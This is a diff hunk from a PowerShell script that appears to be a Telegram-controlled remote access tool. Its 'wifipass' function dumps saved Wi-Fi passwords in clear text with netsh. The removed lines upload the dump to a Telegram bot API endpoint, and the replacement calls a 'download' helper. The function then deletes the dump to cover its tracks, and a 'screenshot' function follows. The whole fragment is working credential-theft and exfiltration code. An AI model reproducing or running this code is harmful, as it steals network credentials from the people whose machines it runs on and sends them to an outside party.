@@ -78,17 +78,15 @@ function wifipass {
 
     # Passwords via powershell
     $passwords = netsh wlan export profile folder=C:\Temp\test key=clear
-
     $uploadPath = "C:\Temp\test"
-    $uri = "https://api.telegram.org/bot + $BotToken"
 
     # Downloading test file to telegram
-    $wc = New-Object System.Net.WebClient
-    $resp = $wc.UploadFile($uri,$uploadPath)
+    download $uploadPath
+    Start-Sleep -Seconds 5
 
     # Deletes the file
     Send-Message "Deleting_Passwords.."
-    Remove-Item $uploadPath -Force
+    Remove-Item $uploadPath -Force -Recurse
 }
 
 function screenshot {
